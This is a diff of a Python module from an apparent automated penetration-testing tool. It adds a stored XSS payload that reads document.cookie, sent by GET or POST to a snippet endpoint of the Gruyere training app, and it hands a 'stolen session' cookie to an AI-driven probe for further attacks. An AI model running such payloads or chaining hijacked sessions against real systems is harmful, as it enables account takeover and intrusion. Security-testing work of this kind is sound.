@@ -443,9 +443,24 @@ def _test_authenticated_access(
 
     # Build next_step_hints: what the system should do next based on findings
     # --- Stored XSS: post a snippet with XSS payload as authenticated user ---
+    # Try both GET and POST to the snippet endpoint (app-specific method varies)
     stored_xss_found = False
     try:
         stored_payload = "<script>alert('aegispt-stored-xss-'+document.cookie)</script>"
+        # Try GET first (Gruyere uses GET for newsnippet2)
+        snippet_resp = client.get(
+            f"{base_origin}{instance}/newsnippet2",
+            params={"snippet": stored_payload, "private": ""},
+            cookies=auth_headers,
+        )
+        if snippet_resp.status_code >= 400:
+            # Fallback to POST
+            snippet_resp = client.post(
+                f"{base_origin}{instance}/newsnippet2",
+                data={"snippet": stored_payload, "private": ""},
+                cookies=auth_headers,
+            )
+        # Legacy endpoint
         snippet_post = client.post(
             f"{base_origin}{instance}/newsnippet.gtl",
             data={"snippet": stored_payload, "private": ""},
@@ -488,6 +503,23 @@ def _test_authenticated_access(
             pass
 
     next_steps: list[dict[str, Any]] = []
+
+    # Always suggest smart-web-probe with the stolen session — it uses Claude API
+    # to discover stored XSS, XSSI, path traversal, and other app-specific attacks
+    # that we couldn't test without authentication.
+    if cookie_name and cookie_value:
+        next_steps.append({
+            "tool": "smart-web-probe",
+            "reason": (
+                f"Authenticated session obtained ({cookie_name}={cookie_value[:20]}...). "
+                "AI-driven probe can now discover stored XSS, XSSI, path traversal, "
+                "and privilege escalation using the stolen session."
+            ),
+            "params": {
+                "session_cookie": {cookie_name: cookie_value},
+            },
+        })
+
     if all_other_users and accessible:
         next_steps.append({
             "tool": "idor-bac",
